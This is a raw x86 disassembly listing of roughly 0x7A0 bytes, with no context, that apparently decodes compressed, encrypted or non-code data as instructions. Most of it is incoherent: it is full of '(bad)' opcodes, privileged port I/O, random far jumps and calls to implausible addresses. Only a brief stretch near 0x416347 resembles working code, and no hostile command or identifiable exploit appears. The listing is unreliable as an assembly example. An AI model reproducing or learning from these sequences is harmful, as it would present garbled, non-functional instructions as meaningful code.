  415f35:	sar    BYTE PTR [esi-0x41413b72],0x40
  415f3c:	fbld   TBYTE PTR [edx-0x13f5ab24]
  415f42:	imul   ebp,DWORD PTR [ebx-0x2a560094],0x37
  415f49:	jmp    0x4add52ff
  415f4e:	dec    ebx
  415f4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f50:	lds    ecx,FWORD PTR [eax]
  415f52:	clc    
  415f53:	jge    0x415f2d
  415f55:	adc    DWORD PTR [esp+edi*1+0x26dece42],esi
  415f5c:	mov    al,ds:0x6cbaf9ef
  415f61:	sub    BYTE PTR [edx-0x4a399be6],ch
  415f67:	retf   0xd7
  415f6a:	rcl    DWORD PTR [ebp+ebx*1-0x363fedc6],1
  415f71:	jmp    0xf396:0x94621050
  415f78:	in     eax,dx
  415f79:	xor    eax,0x44fe703
  415f7e:	es cdq 
  415f80:	xchg   esi,edi
  415f82:	lock inc esi
  415f84:	int3   
  415f85:	push   esi
  415f86:	std    
  415f87:	int    0x4a
  415f89:	lods   eax,DWORD PTR ds:[esi]
  415f8a:	pop    ss
  415f8b:	xchg   DWORD PTR [ecx+0x3c901ac7],esp
  415f91:	add    bh,BYTE PTR [eiz*4+0x5332bd70]
  415f98:	in     al,0x38
  415f9a:	mov    fs,WORD PTR [ebp-0x4]
  415f9d:	mov    ecx,0xdc8cd63a
  415fa2:	mov    ah,0x69
  415fa4:	mov    ah,0xb6
  415fa6:	jnp    0x415f82
  415fa8:	test   DWORD PTR [edi+0xc],edi
  415fab:	daa    
  415fac:	dec    esi
  415fad:	mov    cl,0x17
  415faf:	in     al,dx
  415fb0:	cld    
  415fb1:	xchg   DWORD PTR [esi+0x2b],ebx
  415fb4:	fisttp QWORD PTR [edx+0x59]
  415fb7:	lods   eax,DWORD PTR ds:[esi]
  415fb8:	or     eax,DWORD PTR [ebx]
  415fba:	mov    eax,ds:0x21c37329
  415fbf:	inc    ecx
  415fc0:	enter  0x5eeb,0x5a
  415fc4:	ror    ebx,cl
  415fc6:	inc    eax
  415fc7:	xor    bh,BYTE PTR [eax]
  415fc9:	pop    ss
  415fca:	or     ah,BYTE PTR [eax]
  415fcc:	and    al,0x2b
  415fce:	(bad)  
  415fcf:	cmp    eax,0xd635766c
  415fd4:	or     BYTE PTR [esi],ah
  415fd6:	inc    ebx
  415fd7:	imul   ebp,eax,0xffffffa5
  415fda:	lods   al,BYTE PTR ds:[esi]
  415fdb:	in     eax,0x76
  415fdd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415fde:	sbb    eax,0x9894b522
  415fe3:	outs   dx,DWORD PTR ds:[esi]
  415fe4:	and    eax,0x8dbd6dec
  415fe9:	out    0x26,eax
  415feb:	jge    0x416020
  415fed:	shr    BYTE PTR [edx+0x535d7555],1
  415ff3:	popa   
  415ff4:	repz imul eax,DWORD PTR [ebx+0x5a],0x8be84f11
  415ffc:	jmp    0x416007
  415ffe:	xchg   ebx,eax
  415fff:	mov    eax,ds:0x638319f2
  416004:	inc    edx
  416005:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416006:	mov    esp,0x3fe002aa
  41600b:	(bad)  
  41600c:	fcom   DWORD PTR ds:0xbc0395aa
  416012:	sbb    BYTE PTR [edi],dl
  416014:	mov    ebx,0x5337ccda
  416019:	or     BYTE PTR [edi-0x22],dl
  41601c:	loope  0x41608a
  41601e:	(bad)  
  41601f:	pop    ebp
  416020:	pop    ss
  416021:	sbb    al,0xda
  416023:	jle    0x415fbb
  416025:	std    
  416026:	cmp    bh,0x7c
  416029:	mov    bh,0x77
  41602b:	enter  0xb12d,0xfe
  41602f:	cmp    cl,BYTE PTR [eax-0x62d4b72e]
  416035:	fsub   st,st(1)
  416037:	ficomp DWORD PTR [edx]
  416039:	(bad)  [esp+ebx*1-0x5bc40aa1]
  416040:	test   BYTE PTR [edi],bl
  416042:	ret    
  416043:	(bad)  
  416044:	adc    ch,BYTE PTR [esi+0x5b]
  416047:	or     dl,BYTE PTR [ebp+0xa]
  41604a:	mov    bh,0xaf
  41604c:	out    dx,al
  41604d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41604e:	(bad)
  416051:	inc    ebp
  416052:	jge    0x416099
  416054:	and    ebp,DWORD PTR [eax]
  416056:	sbb    al,0xb6
  416058:	mov    WORD PTR [edx-0x1d],ds
  41605b:	jne    0x416091
  41605d:	fnstenv [ecx+0x7a]
  416060:	inc    ecx
  416061:	leave  
  416062:	stos   DWORD PTR es:[edi],eax
  416063:	pop    esp
  416064:	sbb    BYTE PTR [edx+0x4d],dh
  416067:	mov    ebp,0x14257b8f
  41606c:	add    ch,bl
  41606e:	mov    cl,0x1a
  416070:	rol    eax,cl
  416072:	xchg   ebx,edi
  416074:	scas   al,BYTE PTR es:[edi]
  416075:	add    BYTE PTR [ecx+0x12382686],bl
  41607b:	lods   al,BYTE PTR ds:[esi]
  41607c:	jl     0x41601c
  41607e:	jae    0x416028
  416080:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416081:	and    al,0xd
  416083:	(bad)  
  416084:	dec    eax
  416085:	jge    0x4160ef
  416087:	enter  0x11e4,0x63
  41608b:	test   BYTE PTR [eax+0x42],bl
  41608e:	xchg   ecx,eax
  41608f:	cmp    ebp,eax
  416091:	je     0x4160e9
  416093:	xchg   ebp,eax
  416094:	aad    0x63
  416096:	(bad)  
  416098:	stos   BYTE PTR es:[edi],al
  416099:	pop    edi
  41609a:	aam    0xe2
  41609c:	fisttp WORD PTR [eax+0x5dbac256]
  4160a2:	lock sub BYTE PTR [eax],bl
  4160a5:	mov    bh,0xe8
  4160a7:	cmp    esp,ebx
  4160a9:	sub    eax,0x2083d79e
  4160ae:	clc    
  4160af:	mov    bh,BYTE PTR [eax]
  4160b1:	push   ds
  4160b2:	sub    BYTE PTR [ebp+0x66],bh
  4160b5:	inc    ebp
  4160b6:	inc    ecx
  4160b7:	and    DWORD PTR [ebp*4-0x3c1686a2],esi
  4160be:	or     dl,BYTE PTR [edx+ecx*2-0x2efaeb7]
  4160c5:	xchg   esi,eax
  4160c6:	cmp    BYTE PTR [eax],cl
  4160c8:	jle    0x41609f
  4160ca:	cmp    dl,BYTE PTR [ebp+0x21]
  4160cd:	jno    0x41610b
  4160cf:	test   eax,0x49bac2bf
  4160d4:	mov    ds:0xcb1cbd16,al
  4160d9:	add    BYTE PTR [bx+di],dl
  4160dc:	xor    al,0x94
  4160de:	icebp  
  4160df:	cmp    al,0xaf
  4160e1:	adc    BYTE PTR [edi-0x17],0x44
  4160e5:	xor    al,BYTE PTR [ebx-0x78ef0bd4]
  4160eb:	xor    al,0x53
  4160ed:	push   ds
  4160ee:	xchg   esp,eax
  4160ef:	pop    esi
  4160f0:	fwait
  4160f1:	jge    0x4160a7
  4160f3:	xchg   ebp,eax
  4160f4:	pop    ss
  4160f5:	xchg   ebp,eax
  4160f6:	les    edx,FWORD PTR [ebx-0x255f6048]
  4160fc:	fnstsw WORD PTR [ecx+0xe]
  4160ff:	pop    ecx
  416100:	sub    bl,BYTE PTR [ebx-0x7161b232]
  416106:	sbb    esi,esi
  416108:	call   0xba8eacff
  41610d:	iret   
  41610e:	xchg   BYTE PTR [edx-0x1b94d817],dh
  416114:	scas   eax,DWORD PTR es:[edi]
  416115:	(bad)  
  416116:	(bad)  
  416117:	push   eax
  416118:	(bad)  
  416119:	loope  0x4160ae
  41611b:	fldlg2 
  41611d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41611e:	sub    DWORD PTR [edx],ebp
  416120:	retf   
  416121:	enter  0xa39f,0x76
  416125:	test   edi,ebx
  416127:	cmp    eax,0xbf6b3587
  41612c:	xor    dl,bl
  41612e:	into   
  41612f:	sbb    eax,0x8eb26833
  416134:	push   ss
  416135:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416136:	(bad)  
  416137:	push   0xf952a484
  41613c:	mov    edi,edi
  41613e:	xor    DWORD PTR [esi+0x63b40c8d],eax
  416144:	pushf  
  416145:	cmp    DWORD PTR [ecx-0x2193023a],ecx
  41614b:	dec    esi
  41614c:	mov    eax,ds:0xd436f0a0
  416151:	mov    al,ds:0x9f531256
  416156:	pop    ebp
  416157:	stos   DWORD PTR es:[edi],eax
  416158:	cmp    bh,ch
  41615a:	inc    BYTE PTR [ebx]
  41615c:	mov    edi,0x45f76a5c
  416161:	push   esi
  416162:	ss push ds
  416164:	jp     0x416164
  416166:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416167:	cmp    bh,BYTE PTR [eax+edx*8+0x40be55bc]
  41616e:	int3   
  41616f:	cld    
  416170:	call   0x72c5e8ef
  416175:	sbb    eax,0xdc3c86ce
  41617a:	xchg   BYTE PTR [edi],al
  41617c:	mov    WORD PTR [esi+0x52c336ec],es
  416182:	pop    ss
  416183:	sub    edi,DWORD PTR [ecx+0x4c]
  416186:	retf   0x3f6e
  416189:	mov    ebp,0x2420adc5
  41618e:	jl     0x4161a3
  416190:	jmp    0x302c0189
  416195:	bound  ebp,QWORD PTR [edx+ebp*4+0x58]
  416199:	mov    dh,0x1b
  41619b:	sti    
  41619c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41619d:	mov    bl,BYTE PTR [ebx]
  41619f:	xlat   BYTE PTR ds:[ebx]
  4161a0:	iret   
  4161a1:	fwait
  4161a2:	daa    
  4161a3:	cmp    BYTE PTR [ebp-0x38],bh
  4161a6:	test   al,0x4e
  4161a8:	std    
  4161a9:	fdivr  st(2),st
  4161ab:	add    dl,BYTE PTR [esi]
  4161ad:	ret    0x25a6
  4161b0:	in     eax,dx
  4161b1:	cmp    eax,0x6bb8d37b
  4161b6:	dec    edx
  4161b7:	stos   BYTE PTR es:[edi],al
  4161b8:	out    0xac,eax
  4161ba:	(bad)  
  4161bc:	arpl   WORD PTR [ebx],ax
  4161be:	mov    edx,0x1d4f2573
  4161c3:	xchg   ebx,eax
  4161c4:	xor    dh,BYTE PTR [eax+0x15]
  4161c7:	gs mov bh,0x81
  4161ca:	or     cl,BYTE PTR [eax]
  4161cc:	lahf   
  4161cd:	ret    
  4161ce:	and    eax,0x2fdec30b
  4161d3:	pop    esp
  4161d4:	imul   edi,esi,0x6
  4161d7:	jecxz  0x4161a3
  4161d9:	xchg   BYTE PTR [edi],bl
  4161db:	dec    eax
  4161dc:	loopne 0x416200
  4161de:	pop    edi
  4161df:	jno    0x416239
  4161e1:	xchg   ecx,eax
  4161e2:	cmp    al,0xe1
  4161e4:	add    BYTE PTR [edx+edi*2+0x55],cl
  4161e8:	lock inc edx
  4161ea:	xchg   edi,eax
  4161eb:	mov    eax,ds:0xcc549fe1
  4161f0:	xchg   esp,eax
  4161f1:	inc    ecx
  4161f2:	ja     0x4161c0
  4161f4:	inc    eax
  4161f5:	scas   eax,DWORD PTR es:[edi]
  4161f6:	sar    DWORD PTR [esi+0x56eb13b9],1
  4161fc:	popa   
  4161fd:	scas   al,BYTE PTR es:[edi]
  4161fe:	adc    ah,BYTE PTR [ecx+eax*4-0x54827156]
  416205:	add    eax,0x8d80c333
  41620a:	mov    eax,0x713852cb
  41620f:	stc    
  416210:	ds icebp 
  416212:	je     0x8e8f0e75
  416218:	sub    BYTE PTR [ebp+0x14f79a2d],al
  41621e:	popa   
  41621f:	xor    DWORD PTR [edi+ebx*4],ebp
  416222:	test   DWORD PTR ds:0xf5cba1de,ebx
  416228:	pop    es
  416229:	and    cl,ch
  41622b:	xchg   esp,eax
  41622c:	cmp    eax,DWORD PTR [eax+0x7b]
  41622f:	dec    ecx
  416230:	adc    DWORD PTR [ecx+0x7d],ebx
  416233:	push   esp
  416234:	stos   DWORD PTR es:[edi],eax
  416235:	bound  ebp,QWORD PTR [ecx+eiz*2+0x54ae7606]
  41623c:	call   DWORD PTR [eax]
  41623e:	sub    dl,BYTE PTR [edi]
  416240:	mov    ah,0x74
  416242:	mov    ah,0x7
  416244:	enter  0x8f00,0xd3
  416248:	cs pop ebp
  41624a:	popf   
  41624b:	pop    esp
  41624c:	test   DWORD PTR [eax+0x18],edi
  41624f:	push   edi
  416250:	pop    esi
  416251:	in     eax,0x3c
  416253:	sub    esi,esi
  416255:	fidivr DWORD PTR [ebx+esi*4+0x50efcb89]
  41625c:	adc    dh,dh
  41625e:	pop    ss
  41625f:	sub    ch,BYTE PTR [ebx-0x6f]
  416262:	mov    dl,BYTE PTR [esi-0x11afb698]
  416268:	jmp    0x41627b
  41626a:	stos   BYTE PTR es:[edi],al
  41626b:	popa   
  41626c:	mov    edi,DWORD PTR ds:0x76f235a9
  416272:	mov    edi,0x6e44ef32
  416277:	mov    cl,0xf7
  416279:	cmp    DWORD PTR [esi],0xffffffd5
  41627c:	cmp    al,0x25
  41627e:	inc    edi
  41627f:	xchg   ebx,eax
  416280:	cwde   
  416281:	lds    ecx,FWORD PTR [esi+0x78]
  416284:	(bad)  
  416285:	pop    ebx
  416286:	out    0x51,al
  416288:	sub    cl,al
  41628a:	mov    bh,0x53
  41628c:	and    eax,0x52b17cfa
  416291:	push   esp
  416292:	and    al,0xa7
  416294:	xor    BYTE PTR [edx-0x35],bl
  416297:	out    dx,eax
  416298:	inc    edi
  416299:	jg     0x4162b1
  41629b:	add    eax,DWORD PTR [ebx]
  41629d:	imul   ebx,esp,0xffffffd2
  4162a0:	cmp    edx,DWORD PTR [edi-0x59]
  4162a3:	xor    al,0x4e
  4162a5:	mov    esp,0x7cb0c303
  4162aa:	xchg   ebp,eax
  4162ab:	(bad)  
  4162ac:	jmp    0x865b:0xa8e9795b
  4162b3:	pop    edi
  4162b4:	cmc    
  4162b5:	dec    edx
  4162b6:	sbb    bh,bl
  4162b8:	inc    esi
  4162b9:	push   ss
  4162ba:	jle    0x4162f7
  4162bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4162bd:	sar    DWORD PTR [ecx-0x16],cl
  4162c0:	loopne 0x4162fa
  4162c2:	fisub  WORD PTR [ecx-0x6d]
  4162c5:	cmp    al,0x92
  4162c7:	fstp   st(6)
  4162c9:	daa    
  4162ca:	jmp    0xd36a:0x23e1cc7b
  4162d1:	push   cs
  4162d2:	cli    
  4162d3:	xchg   dh,bh
  4162d5:	ins    BYTE PTR es:[edi],dx
  4162d6:	mov    ecx,0x11944caf
  4162db:	out    dx,eax
  4162dc:	sar    BYTE PTR [ecx-0x4e],1
  4162df:	dec    edx
  4162e0:	jmp    0x9a125e02
  4162e5:	pop    esi
  4162e6:	push   ebx
  4162e7:	jo     0x4162b3
  4162e9:	sahf   
  4162ea:	pusha  
  4162eb:	loopne 0x41635e
  4162ed:	imul   ebp,DWORD PTR [esi+0x5f74cad8],0xd57198ec
  4162f7:	pop    edi
  4162f8:	jns    0x4162a6
  4162fa:	sbb    al,0x99
  4162fc:	cmc    
  4162fd:	scas   al,BYTE PTR es:[edi]
  4162fe:	or     DWORD PTR [eax-0x6342c748],eax
  416304:	inc    ebx
  416305:	shr    DWORD PTR ds:0x29dbe0ac,0x28
  41630c:	dec    eax
  41630d:	cdq    
  41630e:	jp     0x4162f6
  416310:	outs   dx,BYTE PTR ds:[esi]
  416311:	das    
  416312:	repnz (bad) 
  416314:	into   
  416315:	inc    ebx
  416316:	mov    cl,0xf2
  416318:	hlt    
  416319:	test   ch,dl
  41631b:	jmp    0x87a2c7db
  416320:	retf   
  416321:	ret    
  416322:	test   esp,0xc73dbc32
  416328:	inc    ebp
  416329:	aam    0x7d
  41632b:	xor    al,0x0
  41632d:	add    BYTE PTR [ebx+0x558bd445],cl
  416333:	fmul   DWORD PTR [ebx-0x4cd223a3]
  416339:	and    al,0x0
  41633b:	add    BYTE PTR [edi],cl
  41633d:	scas   eax,DWORD PTR es:[edi]
  41633e:	ret    0xef35
  416341:	je     0x416343
  416343:	add    BYTE PTR [ebx],dh
  416345:	shl    bh,cl
  416347:	repz mov edx,DWORD PTR [ebp-0x20]
  41634b:	mov    ebx,DWORD PTR [ebp+0x8]
  41634e:	push   0x20
  416350:	and    eax,edx
  416352:	mov    edx,edi
  416354:	sub    edx,eax
  416356:	sub    edx,0x683
  41635c:	mov    DWORD PTR [ebp-0x2c],edx
  41635f:	mov    eax,DWORD PTR [ebp-0x30]
  416362:	mov    edx,DWORD PTR [ebp-0x34]
  416365:	xor    al,dl
  416367:	mov    edx,DWORD PTR [ebp-0x2c]
  41636a:	xor    al,0x58
  41636c:	and    al,0xd8
  41636e:	add    al,BYTE PTR [ebp+0xc]
  416371:	add    al,0x28
  416373:	jmp    0x41677c
  416378:	mov    ebx,0x41d6c237
  41637d:	cmp    edi,DWORD PTR [ebx-0x6192d245]
  416383:	nop
  416384:	sub    eax,0x3ca4b650
  416389:	int3   
  41638a:	sar    BYTE PTR [esi-0x41413b72],0x57
  416391:	xor    al,0xa8
  416393:	xchg   ecx,eax
  416394:	pop    esi
  416395:	imul   esp,DWORD PTR [ebp+0x50394d24],0x4c
  41639c:	adc    DWORD PTR [edx+0x7d7f3e22],edi
  4163a2:	fsubr  QWORD PTR ds:0x9c9c9b4c
  4163a8:	mov    DWORD PTR [edx+0x34],esp
  4163ab:	pop    es
  4163ac:	ds into 
  4163ae:	enter  0xc976,0x40
  4163b2:	sub    ebx,edx
  4163b4:	sub    dl,BYTE PTR [edi+0x7c4582d]
  4163ba:	xor    BYTE PTR [ecx-0x2a],0xa8
  4163be:	adc    esp,DWORD PTR [ecx+ecx*1-0x70af85d3]
  4163c5:	pop    ss
  4163c6:	jp     0x41637e
  4163c8:	loopne 0x41640d
  4163ca:	popf   
  4163cb:	mov    bl,0x61
  4163cd:	lds    ebx,FWORD PTR [edx+0x6e]
  4163d0:	outs   dx,DWORD PTR ds:[esi]
  4163d1:	mov    esp,0xb28ec4e0
  4163d6:	popf   
  4163d7:	sbb    DWORD PTR [ebp+0x16],0x61e09e9b
  4163de:	loop   0x41644a
  4163e0:	(bad)  
  4163e1:	sub    DWORD PTR [eax],ebp
  4163e3:	icebp  
  4163e4:	jb     0x4163ce
  4163e6:	sbb    eax,DWORD PTR [esi-0x4c]
  4163e9:	shl    DWORD PTR [edx+0x7c],cl
  4163ec:	das    
  4163ed:	xchg   ebx,eax
  4163ee:	(bad)  
  4163ef:	mov    al,ds:0x137313fd
  4163f4:	pushf  
  4163f5:	shr    BYTE PTR [ebx+eax*2-0x50],cl
  4163f9:	call   0x991a46a3
  4163fe:	aad    0x64
  416400:	daa    
  416401:	out    0xcc,al
  416403:	scas   eax,DWORD PTR es:[edi]
  416404:	xchg   ecx,eax
  416405:	out    dx,al
  416406:	push   esi
  416407:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416408:	call   0xfc3f:0x352d7f57
  41640f:	aaa    
  416410:	loopne 0x416410
  416412:	pop    ebx
  416413:	xchg   edx,eax
  416414:	mov    cl,al
  416416:	shr    DWORD PTR [esi+0x74],1
  416419:	dec    eax
  41641a:	mov    ebx,0xa6837986
  41641f:	fnstsw WORD PTR [ebx-0x6e99bc6d]
  416425:	jecxz  0x41643d
  416427:	add    al,0x6
  416429:	lds    esp,FWORD PTR [eax-0x28e912cb]
  41642f:	(bad)  
  416430:	push   cs
  416431:	pusha  
  416432:	xor    DWORD PTR [esi],edx
  416434:	rcl    BYTE PTR [ebx+edx*4-0x27],0x4
  416439:	jge    0x41646d
  41643b:	and    eax,edx
  41643d:	data16 test al,0xf2
  416440:	xchg   esi,eax
  416441:	push   ds
  416442:	or     dl,BYTE PTR [eax-0x1540941e]
  416448:	fdivr  QWORD PTR [edx]
  41644a:	into   
  41644b:	sbb    dl,al
  41644d:	pop    ebp
  41644e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41644f:	cmp    eax,0x7426073e
  416454:	stc    
  416455:	jbe    0x416429
  416457:	mov    al,ds:0xff1061c9
  41645c:	mov    edx,DWORD PTR [edx+0x5517bdd8]
  416462:	sub    ebp,esi
  416464:	push   0x2b
  416466:	jp     0x416426
  416468:	mov    eax,ds:0x49f1a617
  41646d:	xchg   esi,eax
  41646e:	cld    
  41646f:	sub    ebp,DWORD PTR [esi+0x139e928c]
  416475:	mov    esi,0xd38f9f78
  41647a:	pop    ss
  41647b:	sub    eax,0x710ea9fd
  416480:	lahf   
  416481:	in     eax,0xeb
  416483:	hlt    
  416484:	outs   dx,DWORD PTR ds:[esi]
  416485:	dec    edi
  416486:	jb     0x4164b4
  416488:	scas   al,BYTE PTR es:[edi]
  416489:	mov    BYTE PTR [edi+0x10e052a6],0xb9
  416490:	imul   ecx,DWORD PTR [edi],0x20ea9da3
  416496:	test   BYTE PTR [edx+0x15],dl
  416499:	lods   al,BYTE PTR ds:[esi]
  41649a:	cli    
  41649b:	ins    BYTE PTR es:[edi],dx
  41649c:	test   DWORD PTR [ecx+0x31cb8866],0x33e30877
  4164a6:	lods   al,BYTE PTR ds:[esi]
  4164a7:	sti    
  4164a8:	pop    ebx
  4164a9:	leave  
  4164aa:	stc    
  4164ab:	dec    esp
  4164ac:	mov    al,ds:0x5f71dba2
  4164b1:	pop    ebp
  4164b2:	mov    BYTE PTR [eax+0x7410821d],bl
  4164b8:	jne    0x416447
  4164ba:	jae    0x4164d3
  4164bc:	inc    esp
  4164bd:	mov    ch,0xee
  4164bf:	loopne 0x4164c6
  4164c1:	ds in  al,dx
  4164c3:	hlt    
  4164c4:	mov    cl,0xa2
  4164c6:	int3   
  4164c7:	and    eax,0xf494da53
  4164cc:	sahf   
  4164cd:	sub    ch,bl
  4164cf:	test   DWORD PTR [ebx+ebx*1-0x353410a],edi
  4164d6:	(bad)  
  4164d7:	jge    0x416519
  4164d9:	push   ds
  4164da:	xor    edx,DWORD PTR [ecx-0x43]
  4164dd:	inc    edx
  4164de:	pop    ecx
  4164df:	push   eax
  4164e0:	aam    0x5d
  4164e2:	mov    cl,0x12
  4164e4:	icebp  
  4164e5:	xchg   esi,eax
  4164e6:	or     al,0xec
  4164e8:	jp     0x416493
  4164ea:	jp     0x4164fc
  4164ec:	cdq    
  4164ed:	retf   0xeea6
  4164f0:	adc    DWORD PTR [eax-0x60fc7c6d],edi
  4164f6:	or     BYTE PTR [ecx+0x7],dh
  4164f9:	jns    0x41654d
  4164fb:	jp     0x41654d
  4164fd:	ja     0x416485
  4164ff:	dec    eax
  416500:	xchg   esi,eax
  416501:	rcl    DWORD PTR [esi],0x74
  416504:	or     edx,DWORD PTR [ebx-0x51]
  416507:	aas    
  416508:	dec    esi
  416509:	xchg   edx,eax
  41650a:	sbb    bl,al
  41650c:	jge    0x4164ce
  41650e:	test   dl,ah
  416510:	jo     0x41657c
  416512:	dec    eax
  416513:	(bad)  
  416514:	jmp    0x416527
  416516:	cld    
  416517:	popa   
  416518:	stos   BYTE PTR es:[edi],al
  416519:	push   cs
  41651a:	dec    edx
  41651b:	js     0x416557
  41651d:	and    BYTE PTR [ebx+0x31f80423],ch
  416523:	outs   dx,DWORD PTR ds:[esi]
  416524:	scas   al,BYTE PTR es:[edi]
  416525:	add    BYTE PTR ds:0x19317763,al
  41652b:	je     0x416508
  41652d:	outs   dx,BYTE PTR gs:[esi]
  41652f:	inc    esp
  416530:	xor    dh,BYTE PTR [eax+0x15]
  416533:	cmovo  edi,edx
  416536:	out    dx,eax
  416537:	repnz push cs
  416539:	inc    ecx
  41653a:	xchg   edx,eax
  41653b:	jo     0x4164d5
  41653d:	or     al,cl
  41653f:	pop    esi
  416540:	(bad)  
  416541:	aaa    
  416542:	arpl   bp,ax
  416544:	pop    ss
  416545:	out    dx,eax
  416546:	adc    BYTE PTR [ecx+0x5],bh
  416549:	jmp    0x62b1:0x6ffe1cfb
  416550:	inc    edi
  416551:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416552:	cdq    
  416553:	mov    ch,0x82
  416555:	xchg   edx,eax
  416556:	(bad)  
  416557:	test   al,0x78
  416559:	sbb    al,0x5a
  41655b:	pop    esi
  41655c:	mov    ch,0xf9
  41655e:	mov    ?,WORD PTR [eax+0x6c8ecdde]
  416564:	adc    DWORD PTR [ebx],edx
  416566:	dec    eax
  416567:	loope  0x4165c9
  416569:	je     0x4165ce
  41656b:	mov    dh,0xeb
  41656d:	add    edx,DWORD PTR [edi]
  41656f:	sahf   
  416570:	push   ds
  416571:	jbe    0x41655e
  416573:	fnop   
  416575:	jp     0x4164fb
  416577:	inc    esp
  416578:	mov    ecx,eax
  41657a:	mov    dl,0x8f
  41657c:	dec    edi
  41657d:	in     al,0x8e
  41657f:	bnd jne 0x4165c5
  416582:	lahf   
  416583:	adc    eax,0xc3d1e5f
  416588:	aam    0xa0
  41658a:	inc    esi
  41658b:	push   ebp
  41658c:	(bad)  
  41658d:	fistp  WORD PTR [ebx+0x2f]
  416590:	ds (bad) 
  416592:	cmp    BYTE PTR [esi+0x6c],dl
  416595:	ds sbb eax,0x69005821
  41659b:	or     eax,0x6f870a9c
  4165a0:	jl     0x416605
  4165a2:	or     eax,0xb720af01
  4165a7:	jle    0x416621
  4165a9:	leave  
  4165aa:	push   0xffffffbc
  4165ac:	popf   
  4165ad:	gs sbb al,cl
  4165b0:	xchg   ebp,eax
  4165b1:	pop    edx
  4165b2:	hlt    
  4165b3:	adc    bl,BYTE PTR [ecx+0x71]
  4165b6:	outs   dx,DWORD PTR ds:[esi]
  4165b7:	nop
  4165b8:	lock push 0xffffffcd
  4165bb:	push   esp
  4165bc:	pop    es
  4165bd:	popf   
  4165be:	or     ch,BYTE PTR [edi-0x24]
  4165c1:	loope  0x416597
  4165c3:	sbb    DWORD PTR [eax],ebx
  4165c5:	cmp    BYTE PTR [esi+0x329e48ba],ah
  4165cb:	inc    ebp
  4165cc:	(bad)  
  4165cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165ce:	(bad)  
  4165cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165d0:	inc    ebp
  4165d1:	jmp    0x92d6:0xcddb90f2
  4165d8:	repnz dec edi
  4165da:	push   edi
  4165db:	stos   DWORD PTR es:[edi],eax
  4165dc:	inc    ebx
  4165dd:	mov    ah,0x5c
  4165df:	loopne 0x41663e
  4165e1:	lods   eax,DWORD PTR ds:[esi]
  4165e2:	xchg   esi,eax
  4165e3:	test   al,0xf9
  4165e5:	in     al,dx
  4165e6:	hlt    
  4165e7:	cld    
  4165e8:	mov    ch,0x19
  4165ea:	xor    al,0x23
  4165ec:	in     eax,0xb8
  4165ee:	imul   ebx,DWORD PTR [ebp-0xc987779],0x66
  4165f5:	adc    BYTE PTR [edx-0x448898c2],bl
  4165fb:	jnp    0x41658b
  4165fd:	mov    cl,0x7f
  4165ff:	or     DWORD PTR ss:[eax],0x5d0782e
  416606:	jno    0x4165bd
  416608:	push   ecx
  416609:	xor    edx,DWORD PTR [ebx]
  41660b:	sbb    esp,esp
  41660d:	imul   esp,DWORD PTR [edi+edx*4],0xffffffa8
  416611:	stos   BYTE PTR es:[edi],al
  416612:	int    0x4b
  416614:	ret    
  416615:	pop    edx
  416616:	sti    
  416617:	pop    esp
  416618:	and    DWORD PTR [edi],eax
  41661a:	cmp    bh,BYTE PTR [ebx+ecx*4]
  41661d:	mov    al,0x2b
  41661f:	pop    edi
  416620:	jmp    0x5ea6:0xb23e7d57
  416627:	(bad)  
  416629:	push   cs
  41662a:	fistp  QWORD PTR [ecx-0x56]
  41662d:	leave  
  41662e:	mov    esi,0x2e49b434
  416633:	lods   eax,DWORD PTR ds:[esi]
  416634:	ins    DWORD PTR es:[edi],dx
  416635:	xor    al,0x29
  416637:	(bad)  
  416638:	gs pop edi
  41663a:	jge    0x4165e6
  41663c:	aas    
  41663d:	cmp    DWORD PTR [eax+0x17f9748e],0xdf528781
  416647:	cli    
  416648:	add    al,0xfd
  41664a:	sbb    al,0x37
  41664d:	ret    
  41664e:	inc    ebx
  41664f:	outs   dx,BYTE PTR ds:[esi]
  416650:	dec    esi
  416651:	sub    eax,0x4eb65153
  416656:	cld    
  416657:	stos   DWORD PTR es:[edi],eax
  416658:	mov    ds:0xa181d332,al
  41665d:	lods   eax,DWORD PTR ds:[esi]
  41665e:	es xchg esi,eax
  416660:	sbb    DWORD PTR [edx+0x6c920195],esp
  416666:	rcr    DWORD PTR [ecx+ebx*8],0xdf
  41666a:	repnz addr16 push es
  41666d:	in     eax,0x61
  41666f:	fst    QWORD PTR [edi+0x4633a6ed]
  416675:	xor    ebx,0xda43b57b
  41667b:	fld    QWORD PTR [eax]
  41667d:	imul   ebp,DWORD PTR [esi-0x57],0xab730ec0
  416684:	mov    ebx,0xd7660774
  416689:	int    0x82
  41668b:	mov    al,ds:0x6d6e0958
  416690:	pop    eax
  416691:	cli    
  416692:	and    al,0x90
  416694:	sub    DWORD PTR [edx-0xb0ff98b],esi
  41669a:	sbb    dl,BYTE PTR [edi]
  41669c:	mov    es,esp
  41669e:	lods   al,BYTE PTR ds:[esi]
  41669f:	xchg   BYTE PTR [edx-0x6c],bh
  4166a2:	dec    eax
  4166a3:	mov    al,ds:0xb138ac90
  4166a8:	push   ecx
  4166a9:	and    bh,BYTE PTR [edx+0x50b90ec9]
  4166af:	cmp    esi,DWORD PTR [esp+ecx*4-0x168b476c]
  4166b6:	or     ah,bl
  4166b8:	push   edx
  4166b9:	lods   al,BYTE PTR ds:[esi]
  4166ba:	push   0xfffffff2
  4166bc:	popa   
  4166bd:	lods   al,BYTE PTR ds:[esi]
  4166be:	xchg   esi,eax
  4166bf:	(bad)  
  4166c0:	push   edi
  4166c1:	xlat   BYTE PTR ds:[ebx]
  4166c2:	fldenv [esi-0xe]
  4166c5:	dec    esp
  4166c6:	aaa    
  4166c7:	dec    ebp
  4166c8:	mov    ds:0xa7a80142,eax
  4166cd:	mov    edi,0x11660575
  4166d2:	fdiv   st,st(6)
